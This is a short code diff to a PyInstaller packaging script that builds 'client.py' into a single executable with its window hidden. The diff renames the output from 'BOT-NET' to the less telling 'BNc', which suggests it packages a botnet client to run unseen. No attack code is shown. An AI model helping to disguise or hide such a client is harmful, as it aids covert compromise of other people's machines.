@@ -2,7 +2,7 @@ from PyInstaller.__main__ import run
 def package_with_pyinstaller_api():
     opts = [
         "--onefile",
-        "--name", "BOT-NET",
+        "--name", "BNc",
         "--windowed", #需要隐藏窗口
         "client.py",
         ]
